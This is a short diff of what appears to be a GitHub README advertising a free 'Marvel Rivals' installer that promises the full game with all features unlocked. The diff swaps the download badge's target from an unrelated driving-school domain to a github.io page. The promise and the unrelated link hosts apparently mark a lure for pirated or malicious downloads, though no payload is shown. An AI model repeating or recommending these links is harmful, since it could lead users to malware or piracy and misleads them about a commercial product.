@@ -2,7 +2,7 @@
 
 **Marvel Rivals Free Download Installer** is a smart and simple solution to get the full version of *Marvel Rivals* right on your PC. No subscriptions, no hidden steps — just one click to start downloading the entire game with all features unlocked. Experience epic Marvel battles without barriers.
 
-[![Download Marvel Rivals](https://img.shields.io/badge/Download-Marvel_Rivals-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Marvel Rivals](https://img.shields.io/badge/Download-Marvel_Rivals-blueviolet)](https://marvel-rivals-free-download-installer.github.io/.github)
 
 ---
 
